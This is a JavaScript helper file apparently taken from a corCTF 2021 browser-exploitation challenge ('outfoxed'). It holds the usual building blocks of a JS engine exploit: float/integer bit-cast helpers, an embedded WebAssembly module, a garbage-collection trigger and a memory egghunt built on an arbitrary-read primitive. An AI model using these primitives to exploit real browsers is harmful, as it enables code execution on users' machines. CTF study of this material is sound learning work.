// https://org.anize.rs/corCTF-2021/pwn/outfoxed
let __converter = new ArrayBuffer(8);
let __u64view = new BigUint64Array(__converter);
let __f64view = new Float64Array(__converter);

// Bit-cast an uint64_t to a float64
function itod(x) {
    __u64view[0] = x;
    return __f64view[0];
}

// Bit-cast a float64 to an uint64_t
function dtoi(x) {
    __f64view[0] = x;
    return __u64view[0];
}

function hex(x) {
    if (x < 0) {
        return '-' + hex(-x);
    }
    return '0x' + x.toString(16).padStart(16, '0');
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

// Call the GC - Phoenhex function
function gc() {
	let __maxMallocBytes=128*1024*1024; // 128m
	for (var __i = 0; __i < 100; __i++) {
		var __gc_tmp = new ArrayBuffer(__maxMallocBytes); // Allocate locally, but don't save
	}
}

function log(msg) {
    // TODO: Add a HTML log output as well
    console.log(msg);
}

function dump(obj) {
    try {
        dumpObject(obj);
    } catch (e) {
        // nop
    }
}

function egghunt(start, max, egg1, egg2, step=1n) {
    log(`Searching from ${hex(start)} to ${hex(max)}`);
    // Convert the egg once, so it doesn't end up on the heap 4999 times
    let dEgg0 = dtoi(egg1);
    let dEgg1 = dtoi(egg2);
    for (let i = start; i < max - 8n; i+=step) {
        var tmp = r64(i);
        if (tmp == dEgg0) {
            tmp = r64(i + 8n)
            if (tmp == dEgg1) {
                return i;
            }
        }
    }
    return -1;
}
